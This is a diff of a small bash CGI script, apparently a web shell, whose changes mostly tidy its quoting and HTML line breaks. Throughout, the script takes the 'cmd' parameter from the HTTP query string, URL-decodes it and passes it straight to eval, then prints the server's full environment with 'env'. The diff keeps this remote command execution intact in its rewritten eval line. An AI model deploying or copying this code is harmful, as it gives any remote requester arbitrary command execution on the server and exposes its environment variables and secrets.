@@ -1,8 +1,9 @@
 #!/bin/bash
+
 echo -e "Content-type: text/html\n\n"
 
-if [ "$REQUEST_METHOD" = "POST" ]; then
-	read QUERY_STRING
+if [ "${REQUEST_METHOD}" = "POST" ]; then
+	read -r QUERY_STRING
 fi
 
 urldecode() {
@@ -11,13 +12,11 @@ urldecode() {
 
 echo "========================================"
 echo "Result:"
-echo "========================================<BR>"
-# eval $(echo "$QUERY_STRING" | sed 's|cmd=||' | sed 's/+/ /g')
-eval $(echo "$QUERY_STRING" | sed 's|cmd=||' | urldecode)
-echo "<BR>"
-
+echo "========================================<br/>"
+eval "$(echo "${QUERY_STRING}" | sed 's|cmd=||' | urldecode)"
+echo "<br/>"
 echo "========================================"
 echo "Environment:"
-echo "========================================<BR>"
+echo "========================================<br/>"
 env
 echo ""
